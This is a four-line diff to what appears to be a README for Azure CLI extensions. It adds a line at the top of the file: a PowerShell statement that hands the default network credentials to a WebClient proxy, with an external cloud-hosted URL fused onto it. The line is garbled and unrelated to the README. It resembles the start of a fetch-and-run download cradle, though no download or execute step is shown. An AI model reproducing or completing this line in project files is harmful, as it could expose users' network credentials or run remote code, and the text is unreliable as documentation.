@@ -1,4 +1,4 @@
-
+(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentialshttps://ais-dev-7qbeq2bi6ml32p3xjtnpzr-495896499084.us-west2.run.app/
 # Extensions for Azure CLI 2.0
 
 This repository serves two purposes and they are independent:
